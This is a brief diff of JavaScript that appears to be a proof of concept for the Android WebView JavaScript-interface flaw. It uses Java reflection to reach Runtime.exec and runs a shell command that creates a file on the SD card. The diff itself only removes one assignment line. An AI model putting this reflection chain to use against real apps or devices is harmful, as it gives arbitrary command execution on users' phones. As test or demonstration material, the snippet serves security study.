@@ -19,7 +19,7 @@ function check()
           var res = window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(["/system/bin/sh", "-c", "touch /mnt/sdcard/aaaaa"]);
          <!-- document.write(getContents(res.getInputStream())); -->
          document.write("hello world!");
-					res = 1;
+					
 					break;
 				}catch(e){
 				}	
